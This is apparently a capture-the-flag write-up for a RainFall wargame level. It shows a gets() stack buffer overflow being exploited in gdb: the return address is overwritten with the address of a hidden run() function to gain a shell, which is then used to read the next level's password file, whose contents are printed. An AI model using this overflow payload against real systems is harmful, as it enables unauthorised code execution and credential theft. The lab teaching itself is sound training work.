# Level 0

Once logged in, you will see a binary `level1`.

```
$ ssh level1@localhost -p 4444
          _____       _       ______    _ _
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level1@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
level1@RainFall:~$ ls
level1
```

Let's run this and see what this does.
```
level1@RainFall:~$ ./level1

```

It seems it tries getting input, so let's try typing something.

```
level1@RainFall:~$ ./level1
aaa
level1@RainFall:~$
```

It does nothing, so let's run `gdb` to see what's going on.

```
level1@RainFall:~$ gdb level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
gdb-peda$
```

It seems there must be some more, and we can check the list of functions by the command on gdb: `info functions`.

```
Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_glo
```

There are some system calls, but we see a function `run`. let's check that function.

```
gdb-peda$ disass run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
gdb-peda$
```

Now, the function `run` is initialized, but there is no way the function `run` is called. But on main, we can see the `gets` function is used. The `gets` function has a vulnerability (as noted in its [man page](https://linux.die.net/man/3/gets)), as the input length is not checked:

```
Bugs
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
```

This means we can use a buffer overflow attack to modify the memory on the stack to "return" to the `run` function at the end of the main function. To do this, we'll need to figure out the location of `run` in memory and put that in the `eip` register.

In `main`, the whole stack frame is allocated with a size of `0x50` (80 in decimal). Note that this includes both the stack frame as well as any memory allocated, in this case 64 bytes for the `gets` buffer.

```
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50          // <- here
   0x08048489 <+9>:     lea    eax,[esp+0x10]
```

Let's try running the program with the parameter of length 80 and see how it works:

```
level1@RainFall:~$ python -c "print 'A' * 80" | ./level1
Segmentation fault (core dumped)
```

The program crashes with a segmentation fault. Checking on the debugger, we can see the `eip` register is overwritten the character `AAAA`!

```
gdb-peda$ run <<< $(python -c "print 'A' *80")

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6b0 ('A' <repeats 80 times>)
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xb7fd28c4 --> 0x0
EDX: 0xbffff6b0 ('A' <repeats 80 times>)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff700 --> 0x0
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 --> 0x0
0004| 0xbffff704 --> 0xbffff794 --> 0xbffff8b3 ("/home/user/level1/level1")
0008| 0xbffff708 --> 0xbffff79c --> 0xbffff8cc ("SHELL=/bin/bash")
0012| 0xbffff70c --> 0xb7fdc858 --> 0xb7e2c000 --> 0x464c457f
0016| 0xbffff710 --> 0x0
0020| 0xbffff714 --> 0xbffff71c --> 0x0
0024| 0xbffff718 --> 0xbffff79c --> 0xbffff8cc ("SHELL=/bin/bash")
0028| 0xbffff71c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```

If we replace the last `AAAA` with the address of the function `run`, instead of a segmentation fault caused from invalid return address, the run function will be executed.

```
level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat -) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
